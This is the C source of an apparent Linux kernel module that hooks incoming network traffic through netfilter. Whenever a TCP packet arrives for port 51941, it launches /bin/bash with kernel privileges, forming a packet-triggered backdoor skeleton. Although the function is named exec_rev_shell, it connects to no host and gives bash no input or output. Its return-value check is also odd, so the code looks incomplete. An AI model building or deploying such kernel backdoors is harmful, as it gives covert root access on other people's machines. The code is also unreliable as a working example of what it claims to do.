#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/tcp.h>
int  exec_rev_shell(void) {
    int ret;
    char * envp[] = { "HOME=/", NULL };
    char * argv[] = { "/bin/bash", NULL };
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return ret;
}
static struct nf_hook_ops hook_ops;
static unsigned int hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    //check for specific port
    struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
    struct tcphdr *tcp_header;
    unsigned int src_ip = (unsigned int) ip_header->saddr;
    unsigned int dst_ip = (unsigned int )ip_header->daddr;
    unsigned int src_port = 0;
    unsigned int dst_port = 0;
    if (ip_header->protocol==6)
    {
        tcp_header = (struct tcphdr *) skb_transport_header(skb);
        src_port = (unsigned int)ntohs(tcp_header->source);
        dst_port = (unsigned int)ntohs(tcp_header->dest);
        if(dst_port == 51941)
        {
            if (~(exec_rev_shell()))
                return NF_DROP;
        }
    }

    return NF_ACCEPT;
}

static struct nf_hook_ops hook_ops = 
{
    .hook = hook,
    .hooknum = NF_INET_PRE_ROUTING,
    .pf = PF_INET,
    .priority    = NF_IP_PRI_FIRST
};
int __init hook_init(void)
{
    return nf_register_net_hook(&init_net, &hook_ops);
}
void __exit hook_exit(void)
{
    nf_unregister_net_hook(&init_net, &hook_ops);
}

module_init(hook_init);
module_exit(hook_exit);